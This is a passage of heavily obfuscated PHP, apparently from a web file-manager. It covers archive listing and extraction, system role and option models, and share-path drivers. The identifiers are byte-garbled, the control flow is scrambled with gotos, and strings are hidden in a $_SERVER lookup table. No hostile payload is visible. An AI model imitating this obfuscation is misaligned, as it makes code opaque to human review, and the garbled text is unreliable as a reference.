BÍ›¢¦â­: } static function listContent($B‹êæ¸¥‹, $eÑÒ‘øª¤Ù = true) { $føñŸí¹çš =& $_SERVER[…Ò×–]; self::init(); $AÇŒÔ¢¨Œ = !empty($GLOBALS[$føñŸí¹çš[1059]]) ? $GLOBALS[$føñŸí¹çš[1059]] : get_path_ext($B‹êæ¸¥‹); $AÓ‘ö®š¬œ = !1; if (self::checkIfType($AÇŒÔ¢¨Œ, $føñŸí¹çš[1915])) { $døçÀ™èïï = PclTarList($B‹êæ¸¥‹, $AÇŒÔ¢¨Œ); $AÓ‘ö®š¬œ = array(); for ($AòÄ¢â‚ˆ‡ = 0; $AòÄ¢â‚ˆ‡ < count($døçÀ™èïï); $AòÄ¢â‚ˆ‡++) { $c¹™ô°Ğà¡ = $døçÀ™èïï[$AòÄ¢â‚ˆ‡]; if ($c¹™ô°Ğà¡[$føñŸí¹çš[1930]] == $føñŸí¹çš[1931] || $c¹™ô°Ğà¡[$føñŸí¹çš[1930]] == $føñŸí¹çš[1932]) { continue; } if ($eÑÒ‘øª¤Ù) { $c¹™ô°Ğà¡[$føñŸí¹çš[1933]] = ltrim($c¹™ô°Ğà¡[$føñŸí¹çš[1933]], $føñŸí¹çš[1168]); } if ($c¹™ô°Ğà¡[$føñŸí¹çš[1930]] == $føñŸí¹çš[1934]) { $c¹™ô°Ğà¡[$føñŸí¹çš[76]] = !0; } else { $c¹™ô°Ğà¡[$føñŸí¹çš[76]] = !1; } $c¹™ô°Ğà¡[$føñŸí¹çš[1047]] = $AòÄ¢â‚ˆ‡; $AÓ‘ö®š¬œ[] = $c¹™ô°Ğà¡; } } else { if (self::checkIfType($AÇŒÔ¢¨Œ, $føñŸí¹çš[1055])) { $FÃôâİ‹ = kodRarArchive::listContent($B‹êæ¸¥‹); if (!$FÃôâİ‹[$føñŸí¹çš[1043]]) { return $FÃôâİ‹; } else { $AÓ‘ö®š¬œ = $FÃôâİ‹[$føñŸí¹çš[1045]]; } } else { if (kodZipArchive::support($føñŸí¹çš[358])) { $AÓ‘ö®š¬œ = kodZipArchive::listContent($B‹êæ¸¥‹); } else { $aé§†ÃÜŠ = new PclZip($B‹êæ¸¥‹); $AÓ‘ö®š¬œ = $aé§†ÃÜŠ->listContent(); } } } if ($AÓ‘ö®š¬œ) { $a¤ë¬çÏ‘ = unzip_charset_get($AÓ‘ö®š¬œ); $eÑÒ‘øª¤Ù = $eÑÒ‘øª¤Ù && function_exists($føñŸí¹çš[65]); for ($AòÄ¢â‚ˆ‡ = 0; $AòÄ¢â‚ˆ‡ < count($AÓ‘ö®š¬œ); $AòÄ¢â‚ˆ‡++) { $AÓ‘ö®š¬œ[$AòÄ¢â‚ˆ‡][$føñŸí¹çš[1933]] = str_replace(array($føñŸí¹çš[1082], $føñŸí¹çš[1935]), $føñŸí¹çš[768], $AÓ‘ö®š¬œ[$AòÄ¢â‚ˆ‡][$føñŸí¹çš[1933]]); if ($eÑÒ‘øª¤Ù) { $AÓ‘ö®š¬œ[$AòÄ¢â‚ˆ‡][$føñŸí¹çš[1933]] = iconv_to($AÓ‘ö®š¬œ[$AòÄ¢â‚ˆ‡][$føñŸí¹çš[1933]], $a¤ë¬çÏ‘, $føñŸí¹çš[330]); unset($AÓ‘ö®š¬œ[$AòÄ¢â‚ˆ‡][$føñŸí¹çš[1936]]); } } return array($føñŸí¹çš[1043] => !0, $føñŸí¹çš[1045] => $AÓ‘ö®š¬œ); } else { return array($føñŸí¹çš[1043] => !1, $føñŸí¹çš[1045] => $AÓ‘ö®š¬œ); } } static function extract($D«Ìòˆä””, $A ƒ ì–Ë, $f±Ë¹òõë = "\x2d\x31", &$CæĞ¬ãŠƒ = false) { goto d—×¨ãØº; d—×¨ãØº: $eÛÎÍŠ©Ö– =& $_SERVER[…Ò×–]; self::init(); $eÏœß»ò½ = !empty($GLOBALS[$eÛÎÍŠ©Ö–[1059]]) ? $GLOBALS[$eÛÎÍŠ©Ö–[1059]] : get_path_ext($D«Ìòˆä””); goto a³êáñ‚“‹; FØ¡âÜç¹©: if (self::checkIfType($eÏœß»ò½, $eÛÎÍŠ©Ö–[1915])) { if ($f±Ë¹òõë != $eÛÎÍŠ©Ö–[1042]) { $d¯ì®Çôß = unzip_pre_name($d¯ì®Çôß); $bÂ§ÀßÀĞ = unzip_pre_name($bÂ§ÀßÀĞ); $E·å‹®Ğ® = PclTarExtractList($D«Ìòˆä””, array($d¯ì®Çôß), $A ƒ ì–Ë, $bÂ§ÀßÀĞ, $eÏœß»ò½); } else { $E·å‹®Ğ® = PclTarExtract($D«Ìòˆä””, $A ƒ ì–Ë, $eÛÎÍŠ©Ö–[365], $eÏœß»ò½); } return array($eÛÎÍŠ©Ö–[1043] => $E·å‹®Ğ®, $eÛÎÍŠ©Ö–[1045] => PclErrorString(!0)); } else { if (self::checkIfType($eÏœß»ò½, $eÛÎÍŠ©Ö–[1055])) { return kodRarArchive::extract($D«Ìòˆä””, $A ƒ ì–Ë, $eÏœß»ò½, $CæĞ¬ãŠƒ); } else { if (kodZipArchive::support($eÛÎÍŠ©Ö–[1937])) { return kodZipArchive::extract($D«Ìòˆä””, $A ƒ ì–Ë, $CæĞ¬ãŠƒ); } else { $f†ù‹ĞšÆÆ = new PclZip($D«Ìòˆä””); if ($f±Ë¹òõë != $eÛÎÍŠ©Ö–[1042]) { $E·å‹®Ğ® = $f†ù‹ĞšÆÆ->extract(PCLZIP_OPT_PATH, $A ƒ ì–Ë, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $eÛÎÍŠ©Ö–[1938], PCLZIP_OPT_BY_NAME, $E’Š®ÂˆÏ[$eÛÎÍŠ©Ö–[1933]], PCLZIP_OPT_REMOVE_PATH, $bÂ§ÀßÀĞ, PCLZIP_OPT_REPLACE_NEWER); } else { $E·å‹®Ğ® = $f†ù‹ĞšÆÆ->extract(PCLZIP_OPT_PATH, $A ƒ ì–Ë, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $eÛÎÍŠ©Ö–[1938], PCLZIP_OPT_REPLACE_NEWER); } return array($eÛÎÍŠ©Ö–[1043] => $E·å‹®Ğ®, $eÛÎÍŠ©Ö–[1045] => $f†ù‹ĞšÆÆ->errorName(!0)); } } } return array($eÛÎÍŠ©Ö–[1043] => !1, $eÛÎÍŠ©Ö–[1045] => $eÛÎÍŠ©Ö–[1939]); goto CØ¹éùì‰; a³êáñ‚“‹: $e£ØÇ™ĞÇ½ = self::listContent($D«Ìòˆä””, !1); if (!$e£ØÇ™ĞÇ½[$eÛÎÍŠ©Ö–[1043]]) { return $e£ØÇ™ĞÇ½; } if ($f±Ë¹òõë != $eÛÎÍŠ©Ö–[1042]) { goto DÄ³²×áÊ„; F¤ÇŒÅ×Òµ: if ($GLOBALS[$eÛÎÍŠ©Ö–[6]][$eÛÎÍŠ©Ö–[1166]] != $eÛÎÍŠ©Ö–[330]) { $d¯ì®Çôß = unzip_pre_name($CæĞ¬ãŠƒ); } $bÂ§ÀßÀĞ = get_path_father($CæĞ¬ãŠƒ); if ($bÂ§ÀßÀĞ == $CæĞ¬ãŠƒ) { $bÂ§ÀßÀĞ = $eÛÎÍŠ©Ö–[33]; } goto c±ªÅ›Ë‘«; DÄ³²×áÊ„: $E’Š®ÂˆÏ = self::fileIndex($e£ØÇ™ĞÇ½[$eÛÎÍŠ©Ö–[1045]], $f±Ë¹òõë); $CæĞ¬ãŠƒ = str_replace(array($eÛÎÍŠ©Ö–[1082], $eÛÎÍŠ©Ö–[1935]), $eÛÎÍŠ©Ö–[70], $E’Š®ÂˆÏ[$eÛÎÍŠ©Ö–[1933]]); $d¯ì®Çôß = $CæĞ¬ãŠƒ; goto F¤ÇŒÅ×Òµ; c±ªÅ›Ë‘«: if ($E’Š®ÂˆÏ[$eÛÎÍŠ©Ö–[76]]) { $d¯ì®Çôß = rtrim($d¯ì®Çôß, $eÛÎÍŠ©Ö–[8]) . $eÛÎÍŠ©Ö–[8]; $CæĞ¬ãŠƒ = array($CæĞ¬ãŠƒ); } $CŞÜÅŒ‹º¦ = str_replace($eÛÎÍŠ©Ö–[93], $eÛÎÍŠ©Ö–[8], $d¯ì®Çôß); if (substr($CŞÜÅŒ‹º¦, -1) == $eÛÎÍŠ©Ö–[8]) { if (!strstr(trim($CŞÜÅŒ‹º¦, $eÛÎÍŠ©Ö–[8]), $eÛÎÍŠ©Ö–[8])) { $A ƒ ì–Ë = $A ƒ ì–Ë . get_path_this($CŞÜÅŒ‹º¦) . $eÛÎÍŠ©Ö–[8]; } } else { if ($bÂ§ÀßÀĞ == $d¯ì®Çôß) { $bÂ§ÀßÀĞ = $eÛÎÍŠ©Ö–[33]; } } goto dÜ´ŠÌÒù½; dÜ´ŠÌÒù½: } goto FØ¡âÜç¹©; CØ¹éùì‰: } static function fileIndex($dĞç«çŠ¼, $d³§…†ï†­, $AÔ†Ò”´§ù = false) { goto Bİ´ëòÄ‡Ì; eÈ·â¸„: $EòË½ŒÙ§ = $DñÔÌø¼Ù; if ($AÔ†Ò”´§ù) { $EòË½ŒÙ§ = $DñÔÌø¼Ù[$AÔ†Ò”´§ù]; if ($DñÔÌø¼Ù[$cÅğ±±‘ã×[76]]) { $EòË½ŒÙ§ = rtrim($EòË½ŒÙ§, $cÅğ±±‘ã×[8]) . $cÅğ±±‘ã×[8]; } } return $EòË½ŒÙ§; goto AïÄÚÁÚ; f§êêÖ©Ø¼: $aŞÓÕÄøîÚ = count($dĞç«çŠ¼); for ($d“‘›ÀÈµ¦ = 0; $d“‘›ÀÈµ¦ < $aŞÓÕÄøîÚ; $d“‘›ÀÈµ¦++) { if ($d³§…†ï†­ == $dĞç«çŠ¼[$d“‘›ÀÈµ¦][$cÅğ±±‘ã×[1047]]) { $DñÔÌø¼Ù = $dĞç«çŠ¼[$d“‘›ÀÈµ¦]; break; } } if (!$DñÔÌø¼Ù) { show_tips($cÅğ±±‘ã×[1940]); } goto eÈ·â¸„; Bİ´ëòÄ‡Ì: $cÅğ±±‘ã× =& $_SERVER[…Ò×–]; self::init(); if (!is_array($dĞç«çŠ¼)) { return !1; } goto f§êêÖ©Ø¼; AïÄÚÁÚ: } static function extractZipFile($E–İ’ÏÈ¦¦, $e®‹£ö‡„Ö, $EÄ†İ“Öñ« = false) { goto CŒÙ‡çš”; DÉßğ¯óÁŠ: mk_dir($A–Šå´°¦); $Aƒ·ßšÛÌ£ = $A–Šå´°¦ . md5($E–İ’ÏÈ¦¦ . $e®‹£ö‡„Ö); if ($EÄ†İ“Öñ«) { $Aƒ·ßšÛÌ£ = $A–Šå´°¦ . $EÄ†İ“Öñ«; } goto fÆ²™¯ÁÂ·; fÆ²™¯ÁÂ·: if (file_exists($Aƒ·ßšÛÌ£)) { return $Aƒ·ßšÛÌ£; } $F¾¬¼Õ¢¨ = new PclZip($E–İ’ÏÈ¦¦); $A¥ó¬ÜÒéÌ = unzip_filter_ext($A–Šå´°¦ . get_path_this($e®‹£ö‡„Ö)); goto DÈÂìèğ; DÈÂìèğ: $cÌÌ¡øí–Ç = get_path_father($e®‹£ö‡„Ö); if ($cÌÌ¡øí–Ç == $e®‹£ö‡„Ö) { $cÌÌ¡øí–Ç = $a¯Äğá‚ª”[33]; } $d»ÉÙÉ˜¸¼ = $F¾¬¼Õ¢¨->extract(PCLZIP_OPT_PATH, $A–Šå´°¦, PCLZIP_CB_PRE_FILE_NAME, $a¯Äğá‚ª”[1938], PCLZIP_OPT_REMOVE_PATH, $cÌÌ¡øí–Ç, PCLZIP_OPT_BY_NAME, $e®‹£ö‡„Ö); goto CË­ô—½®ò; CË­ô—½®ò: if (!file_exists($A¥ó¬ÜÒéÌ)) { return !1; } @rename($A¥ó¬ÜÒéÌ, $Aƒ·ßšÛÌ£); return $Aƒ·ßšÛÌ£; goto c‘‘Û–ìº¦; CŒÙ‡çš”: $a¯Äğá‚ª” =& $_SERVER[…Ò×–]; self::init(); $A–Šå´°¦ = TEMP_FILES . hash_path($E–İ’ÏÈ¦¦) . $a¯Äğá‚ª”[8]; goto DÉßğ¯óÁŠ; c‘‘Û–ìº¦: } static function filePreview($dµğë’¾­ƒ, $DğŸøí³ÅŞ, $Fñµ£Î™È‚ = false, $aÓ£³¯ˆ‡ = false) { goto dàĞµ÷èØî; dªİŠ›ğ¹É: $f¹Ïì Éóö = self::extract($dµğë’¾­ƒ, $eÂ‚ßŠñœ•, $DğŸøí³ÅŞ, $bÃÜš¢„º); if (is_array($bÃÜš¢„º)) { show_json($cÔÎ‡‰×®É[1941], !1); } if (file_exists($C¯ŸŸÆœáÚ)) { IO::fileOut($C¯ŸŸÆœáÚ, $Fñµ£Î™È‚, get_path_this($bÃÜš¢„º)); return; } goto c±ƒ½İæêé; cƒ»¶ºà¿»: if (!file_exists($C¯ŸŸÆœáÚ)) { del_dir($eÂ‚ßŠñœ•); show_json($cÔÎ‡‰×®É[1943]); } IO::fileOut($C¯ŸŸÆœáÚ, $Fñµ£Î™È‚, $bÃ‘ÔëÙà); goto a·†ëå‘†Ì; c±ƒ½İæêé: $bÃÜš¢„º = unzip_pre_name($bÃÜš¢„º); $bÃ‘ÔëÙà = get_path_this($bÃÜš¢„º); $D´õ‰¬‘¦Ì = unzip_filter_ext($eÂ‚ßŠñœ• . $bÃ‘ÔëÙà); goto d¥äåÔ·¦È; dàĞµ÷èØî: $cÔÎ‡‰×®É =& $_SERVER[…Ò×–]; self::init(); $eÂ‚ßŠñœ• = TEMP_FILES . hash_path($dµğë’¾­ƒ) . $cÔÎ‡‰×®É[8]; goto d‹½Ûõ‹Õ³; d¥äåÔ·¦È: if (!$f¹Ïì Éóö[$cÔÎ‡‰×®É[1043]]) { show_json($f¹Ïì Éóö[$cÔÎ‡‰×®É[1045]], !1); } if (!file_exists($D´õ‰¬‘¦Ì)) { show_json($cÔÎ‡‰×®É[1942], !1); } @rename($D´õ‰¬‘¦Ì, $C¯ŸŸÆœáÚ); goto cƒ»¶ºà¿»; d‹½Ûõ‹Õ³: mk_dir($eÂ‚ßŠñœ•); $C¯ŸŸÆœáÚ = $eÂ‚ßŠñœ• . md5($dµğë’¾­ƒ . $DğŸøí³ÅŞ . $aÓ£³¯ˆ‡); $bÃÜš¢„º = $cÔÎ‡‰×®É[33]; goto dªİŠ›ğ¹É; a·†ëå‘†Ì: } static function create($aõà‚™£¼£, $c÷‹Œê³ç) { $A•Å²®†ê =& $_SERVER[…Ò×–]; self::init(); $F¥¸ğí±’ = get_path_ext($aõà‚™£¼£); $bÆ¥¶°¾ŸÔ = !1; if (self::checkIfType($F¥¸ğí±’, $A•Å²®†ê[305])) { if (kodZipArchive::support($A•Å²®†ê[1018])) { return kodZipArchive::create($aõà‚™£¼£, $c÷‹Œê³ç); } $eùøœßé³­ = new PclZip($aõà‚™£¼£); foreach ($c÷‹Œê³ç as $fëğ˜¶öÄ => $Bƒ´öÏç¼Š) { $Bƒ´öÏç¼Š = str_replace($A•Å²®†ê[472], $A•Å²®†ê[8], $Bƒ´öÏç¼Š); $B†–à‰ò = Kodio::clear(get_path_father($Bƒ´öÏç¼Š)); if ($fëğ˜¶öÄ == 0) { $bÆ¥¶°¾ŸÔ = $eùøœßé³­->create($Bƒ´öÏç¼Š, PCLZIP_OPT_REMOVE_PATH, $B†–à‰ò, PCLZIP_CB_PRE_FILE_NAME, $A•Å²®†ê[1944]); continue; } $bÆ¥¶°¾ŸÔ = $eùøœßé³­->add($Bƒ´öÏç¼Š, PCLZIP_OPT_REMOVE_PATH, $B†–à‰ò, PCLZIP_CB_PRE_FILE_NAME, $A•Å²®†ê[1944]); } } else { if (self::checkIfType($F¥¸ğí±’, $A•Å²®†ê[1915])) { foreach ($c÷‹Œê³ç as $fëğ˜¶öÄ => $Bƒ´öÏç¼Š) { $Bƒ´öÏç¼Š = str_replace($A•Å²®†ê[472], $A•Å²®†ê[8], $Bƒ´öÏç¼Š); $B†–à‰ò = Kodio::clear(get_path_father($Bƒ´öÏç¼Š)); if ($fëğ˜¶öÄ == 0) { $bÆ¥¶°¾ŸÔ = PclTarCreate($aõà‚™£¼£, array($Bƒ´öÏç¼Š), $F¥¸ğí±’, null, $B†–à‰ò); continue; } $bÆ¥¶°¾ŸÔ = PclTarAddList($aõà‚™£¼£, array($Bƒ´öÏç¼Š), $A•Å²®†ê[33], $B†–à‰ò, $F¥¸ğí±’); } } } return $bÆ¥¶°¾ŸÔ; } } goto Fï¶µ‰¤Á; Cãø´ø•øŒ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\155\137\x6f\160\x74\x69\157\156"; protected $jsonField = array("\155\x65\x6e\x75", "\x72\157\154\x65", "\162\x6f\x6c\x65\x47\162\x6f\165\160", "\162\x65\x67\x69\x73\164", "\x65\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($B„åÀ—‹©) { return "\x53\171\163\164\145\x6d\117\x70\164\x69\x6f\156\x5f{$B„åÀ—‹©}"; } protected function optionDefault($Dî´²¾ëÒ½ = '') { $DŸÏÂ›£ÍÕ =& $_SERVER[…Ò×–]; if ($Dî´²¾ëÒ½ == $DŸÏÂ›£ÍÕ[33]) { return $GLOBALS[$DŸÏÂ›£ÍÕ[6]][$DŸÏÂ›£ÍÕ[2522]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\162\157\154\x65\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\141\x75\x74\150", "\154\141\142\145\x6c", "\144\151\x73\x70\x6c\x61\171", "\163\x79\163\x74\145\155", "\x64\145\x73\143", "\151\x67\x6e\157\162\x65\105\170\164", "\151\x67\x6e\157\x72\x65\x46\x69\x6c\145\x53\151\x7a\145", "\x61\144\155\151\156\x69\163\164\162\x61\164\x6f\162", "\x73\157\x72\x74"); public function listData($A²Á’¥²Ë— = false, $E ‹î†£â = "\163\157\x72\164", $b±êÉåÁø¯ = false) { $e…ä´‡Í“ =& $_SERVER[…Ò×–]; $bÂŒ«’±”â = parent::listData($A²Á’¥²Ë—, $E ‹î†£â, $b±êÉåÁø¯); if (!$A²Á’¥²Ë—) { $CòÛ°„—Ÿ° = $e…ä´‡Í“[2523]; foreach ($bÂŒ«’±”â as $DÎÚ âØß³ => $B÷×Ìôø¡) { if ($B÷×Ìôø¡[$e…ä´‡Í“[2305]] == 1) { $bÂŒ«’±”â[$DÎÚ âØß³][$e…ä´‡Í“[409]] = $CòÛ°„—Ÿ°; } } } return $bÂŒ«’±”â; } public function update($aÑÓ¢Ï§–, $BìÙê‚†¨£) { goto DàŠñŠ”¦; c‡´ŒÎä‹: if (!$E ´­¡øŞë || $a¿÷šªÚƒ && $a¿÷šªÚƒ[$BÉ÷ ô‰¢Ó[371]] != $E ´­¡øŞë[$BÉ÷ ô‰¢Ó[371]]) { return !1; } if ($a¿÷šªÚƒ[$BÉ÷ ô‰¢Ó[2305]] == 1) { $BìÙê‚†¨£ = array($BÉ÷ ô‰¢Ó[28] => $BìÙê‚†¨£[$BÉ÷ ô‰¢Ó[28]], $BÉ÷ ô‰¢Ó[2139] => $BìÙê‚†¨£[$BÉ÷ ô‰¢Ó[2139]]); } $this->filterAuth($BìÙê‚†¨£[$BÉ÷ ô‰¢Ó[380]]); goto cÊƒ¢á’¼Æ; cÊƒ¢á’¼Æ: return parent::update($aÑÓ¢Ï§–, $BìÙê‚†¨£); goto a•ŠÏƒÚ„Ö; DàŠñŠ”¦: $BÉ÷ ô‰¢Ó =& $_SERVER[…Ò×–]; $E ´­¡øŞë = parent::listData($aÑÓ¢Ï§–); $a¿÷šªÚƒ = $this->findByName($BìÙê‚†¨£[$BÉ÷ ô‰¢Ó[28]]); goto c‡´ŒÎä‹; a•ŠÏƒÚ„Ö: } public function remove($EÆ©ªæºªÏ) { $b°èÑ²¿Å = parent::listData($EÆ©ªæºªÏ); if (!$b°èÑ²¿Å || $b°èÑ²¿Å[$_SERVER[…Ò×–][1090]]) { return !1; } return parent::remove($EÆ©ªæºªÏ); } public function add($aßêâ¬ß®£) { goto AÂ¸Ãñœ«; AÂ¸Ãñœ«: $aÂŞâÌ±çõ =& $_SERVER[…Ò×–]; $d”ßºêá†› = $aßêâ¬ß®£[$aÂŞâÌ±çõ[28]]; if ($this->findByName($d”ßºêá†›)) { return !1; } goto Aæ£‰ìİ§“; Aæ£‰ìİ§“: $FŠ©ÜÍĞ´ = array($aÂŞâÌ±çõ[390] => $d”ßºêá†›, $aÂŞâÌ±çõ[2125] => $aÂŞâÌ±çõ[33], $aÂŞâÌ±çõ[2121] => $aÂŞâÌ±çõ[2129], $aÂŞâÌ±çõ[2524] => 1, $aÂŞâÌ±çõ[2124] => 0, $aÂŞâÌ±çõ[2525] => 0, $aÂŞâÌ±çõ[2123] => $this->getSort()); $aßêâ¬ß®£ = array_merge($FŠ©ÜÍĞ´, $aßêâ¬ß®£); $this->filterAuth($aßêâ¬ß®£[$aÂŞâÌ±çõ[380]]); goto F‡ªéçğµ; F‡ªéçğµ: return parent::insert($aßêâ¬ß®£); goto eŸ•˜ÏØÖ”; eŸ•˜ÏØÖ”: } private function getSort() { $e«øç°×«™ =& $_SERVER[…Ò×–]; $CÕË§‚ÙÑ¨ = parent::listData(); $c†–ÜäÈèá = array_to_keyvalue($CÕË§‚ÙÑ¨, $e«øç°×«™[33], $e«øç°×«™[2141]); return empty($c†–ÜäÈèá) ? 0 : max($c†–ÜäÈèá) + 1; } private function filterAuth(&$E™ØóÒ‚) { $AÉİáàáô =& $_SERVER[…Ò×–]; $b½„• ğÛÀ = array(); $fÃé‘ÃÎº÷ = array_filter(explode($AÉİáàáô[47], $E™ØóÒ‚)); foreach ($fÃé‘ÃÎº÷ as $E™ØóÒ‚) { $e™½ç–¾Şª = explode($AÉİáàáô[91], $E™ØóÒ‚); if ($e™½ç–¾Şª[0] == $AÉİáàáô[1796] && $e™½ç–¾Şª[1] != $AÉİáàáô[1047]) { $E £ÈÉ–Åã = $e™½ç–¾Şª[0] . $AÉİáàáô[91] . $e™½ç–¾Şª[1] . $AÉİáàáô[2526]; if (!in_array($E £ÈÉ–Åã, $fÃé‘ÃÎº÷)) { $b½„• ğÛÀ[] = $E £ÈÉ–Åã; } } $b½„• ğÛÀ[] = $E™ØóÒ‚; } $E™ØóÒ‚ = implode($AÉİáàáô[47], $b½„• ğÛÀ); } public function sort($fŒ‘—Âš, $a¶ªÒèÆ„«) { return parent::update($fŒ‘—Âš, $a¶ªÒèÆ„«); } } goto a±˜†Ù†İğ; Fà¢¡¤œÓ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($fÆĞ†ñ—Î‚) { $this->pathParse = $fÆĞ†ñ—Î‚; $this->model = Model($_SERVER[…Ò×–][1127]); } public function getPathOuter($c¦‹Ò¢ÕÇÓ) { $DôŞÏ •†á =& $_SERVER[…Ò×–]; if (!$c¦‹Ò¢ÕÇÓ) { return $c¦‹Ò¢ÕÇÓ; } $eÑÇöí˜Ó  = $this->parse($c¦‹Ò¢ÕÇÓ); return trim(KodIO::makeShare($this->pathParse[$DôŞÏ •†á[371]], $eÑÇöí˜Ó [$DôŞÏ •†á[371]]), $DôŞÏ •†á[8]); } protected function infoParse($bÀğñ‰‚¨, $Eîâ–æÙ‚ö = false, $E§±†–¸ÇŒ = false) { $a¸Ÿí£ñŒ =& $_SERVER[…Ò×–]; $e÷¦éÎ¡‡ä = $this->pathParse[$a¸Ÿí£ñŒ[371]]; $D”ƒ¿âÑÒ = trim($this->pathParse[$a¸Ÿí£ñŒ[1023]], $a¸Ÿí£ñŒ[8]); return Action($a¸Ÿí£ñŒ[1137])->sharePathInfo($e÷¦éÎ¡‡ä, $D”ƒ¿âÑÒ); } public function infoFull($Fºìˆ²Ãè) { $aŠ×Öõ„èÌ =& $_SERVER[…Ò×–]; $BÁ“¢ºğ = explode($aŠ×Öõ„èÌ[8], trim($Fºìˆ²Ãè, $aŠ×Öõ„èÌ[8])); if (count($BÁ“¢ºğ) > 1) { $dÍæ‘ìò»¤ = implode($aŠ×Öõ„èÌ[8], array_splice($BÁ“¢ºğ, 1)); $f¿Œê÷£› = $this->model->pathInfoByPath($BÁ“¢ºğ[0], $dÍæ‘ìò»¤); if (!$f¿Œê÷£›) { return !1; } $this->pathParse[$aŠ×Öõ„èÌ[1023]] = $f¿Œê÷£›[$aŠ×Öõ„èÌ[373]]; } return $this->infoParse($Fºìˆ²Ãè); } public function listAll($FØŞ‘©¯¥°) { goto b©„öÕ‹ˆÀ; b©„öÕ‹ˆÀ: $cÊ§ğå»œŞ =& $_SERVER[…Ò×–]; $DÂ‹¼¯„ = IO::info($this->pathParse[$cÊ§ğå»œŞ[75]]); if (!$DÂ‹¼¯„) { return array(); } goto f˜È¹¡²Ã; Cíê–Ù¹øÛ: foreach ($Fî˜åìšˆ‰ as &$Aî½Ì‡ËÎ¾) { check_abort(); $Aî½Ì‡ËÎ¾[$cÊ§ğå»œŞ[395]] = $eÆàİ†À¢Å->_shareItemeParse($Aî½Ì‡ËÎ¾[$cÊ§ğå»œŞ[395]], $fîç”ØÀéÕ); } unset($Aî½Ì‡ËÎ¾); return $Fî˜åìšˆ‰; goto d°ñ­×İ‹´; f˜È¹¡²Ã: $Fî˜åìšˆ‰ = $this->model->listAll($FØŞ‘©¯¥°); $fîç”ØÀéÕ = Model($cÊ§ğå»œŞ[540])->getInfo($DÂ‹¼¯„[$cÊ§ğå»œŞ[444]]); $eÆàİ†À¢Å = Action($cÊ§ğå»œŞ[1137]); goto Cíê–Ù¹øÛ; d°ñ­×İ‹´: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($bİ÷£‘Ø›Æ) { $this->pathParse = $bİ÷£‘Ø›Æ; $this->model = Model($_SERVER[…Ò×–][1127]); } protected function infoParse($DœÑ¶Œå¤, $EË¢ÅíÍ¤¸ = false, $Fí™«èÁ„ = false) { $a•ì«ïø =& $_SERVER[…Ò×–]; return Action($a•ì«ïø[1029])->sharePathInfo($this->pathParse[$a•ì«ïø[75]], !0); } public function listPath($bÑ£ÜİŒÈæ, $C§…á·™Ô = false) { $aÎ÷”ÓÚÇ‚ =& $_SERVER[…Ò×–]; $e¶†™‘ÆÖŞ = parent::listPath($bÑ£ÜİŒÈæ, $C§…á·™Ô); foreach ($e¶†™‘ÆÖŞ as $aÚëÙÙÑ§— => $cæÜÅ®Â½) { if (!in_array($aÚëÙÙÑ§—, array($aÎ÷”ÓÚÇ‚[73], $aÎ÷”ÓÚÇ‚[74]))) { continue; } foreach ($cæÜÅ®Â½ as $dìğÑã‹îÍ => $b‚æÉÒ‰´) { $e¶†™‘ÆÖŞ[$aÚëÙÙÑ§—][$dìğÑã‹îÍ] = Action($aÎ÷”ÓÚÇ‚[1029])->shareItemInfo($b‚æÉÒ‰´); } } return $e¶†™‘ÆÖŞ; } public function listAll($aéÅ¿…ô£) { goto eÛåçÅ­Ã–; f…¬“Œšä: return $Fœ²ç‰ã‰Ô; goto aÖ¶ÅÈ¡î; EÔÛœÁÊ·ğ: $Fœ²ç‰ã‰Ô = $this->model->listAll($aéÅ¿…ô£); foreach ($Fœ²ç‰ã‰Ô as &$c£®æ‚ôÕÇ) { $c£®æ‚ôÕÇ[$fÑ˜º¿õÀ[395]] = Action($fÑ˜º¿õÀ[1029])->shareItemInfo($c£®æ‚ôÕÇ[$fÑ˜º¿õÀ[395]]); } unset($c£®æ‚ôÕÇ); goto f…¬“Œšä; eÛåçÅ­Ã–: $fÑ˜º¿õÀ =& $_SERVER[…Ò×–]; $cÙ¡È„œÆß = IO::info($this->pathParse[$fÑ˜º¿õÀ[75]]); if (!$cÙ¡È„œÆß) { return array(); } goto EÔÛœÁÊ·ğ; aÖ¶ÅÈ¡î: } } class PathDriverDriverShareItem { public function __construct($d™•Œ‘¥®ã) { $this->pathParse = $d™•Œ‘¥®ã; } public function __call($DŠ§Ú¤ĞÍ, $f«¼ˆ¾ºƒï) { $d¢šèµÆŸ„ =& $_SERVER[…Ò×–]; if (method_exists($this, $DŠ§Ú¤ĞÍ)) { return; } $d´ã©å°¯‡ = call_user_func_array(array($d¢šèµÆŸ„[1138], $DŠ§Ú¤ĞÍ), $f«¼ˆ¾ºƒï); $eİ†×Œó§­ = array($d¢šèµÆŸ„[1139], $d¢šèµÆŸ„[1140], $d¢šèµÆŸ„[1141], $d¢šèµÆŸ„[1142], $d¢šèµÆŸ„[495], $d¢šèµÆŸ„[497], $d¢šèµÆŸ„[1143], $d¢šèµÆŸ„[103], $d¢šèµÆŸ„[1144], $d¢šèµÆŸ„[1145]); if (in_array($DŠ§Ú¤ĞÍ, $eİ†×Œó§­)) { $d´ã©å°¯‡ = $this->getPathOuter($d´ã©å°¯‡); } return $d´ã©å°¯‡; } public function copy($Aµ¯ƒ÷Ñğ‰, $B‡¯®ê¶êá, $D§´³¯·­Ì = false) { return $this->copyMove($Aµ¯ƒ÷Ñğ‰, $B‡¯®ê¶êá, $D§´³¯·­Ì, $_SERVER[…Ò×–][495]); } public function move($dÎ—”ó•Øæ, $Aœ½õ×·¦Ü, $f²–ìŸõ¾Í = false) { return $this->copyMove($dÎ—”ó•Øæ, $Aœ½õ×·¦Ü, $f²–ìŸõ¾Í, $_SERVER[…Ò×–][497]); } private function copyMove($d·Œê¡Õ«´, $d¦Œôœ‡¼¢, $bæò§ï„µ‚, $FìœîíÂ„ä) { goto dîæØ¯Á¼ä; AÙ…›Å½ë: return $d…ê¶Ø‘Ö; goto E¡­”­¢ŠÙ; dîæØ¯Á¼ä: $AÉ¯ºá–†ê =& $_SERVER[…Ò×–]; $DÒÀÊæË = 